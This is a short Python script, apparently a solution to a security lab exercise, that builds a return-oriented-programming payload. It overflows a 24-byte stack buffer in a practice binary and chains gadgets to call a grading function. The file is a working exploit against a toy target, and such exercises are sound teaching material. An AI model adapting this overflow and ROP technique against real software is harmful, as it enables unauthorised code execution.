#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

Overflow input()'s stack buffer and place a ROP chain:
    ret           (0x401a34)   -> fix 16-byte stack alignment before printf
    pop rdi; ret  (0x401a33)   -> rdi = 4
    4
    grade_eval    (0x401978)   -> print "Hope A will be your grade!"
"""
import sys

payload = b"A" * 24
payload += (0x401a34).to_bytes(8, "little")  # ret（栈对齐）
payload += (0x401a33).to_bytes(8, "little")  # pop rdi; ret
payload += (4).to_bytes(8, "little")         # rdi = 4
payload += (0x401978).to_bytes(8, "little")  # grade_eval

sys.stdout.buffer.write(payload)
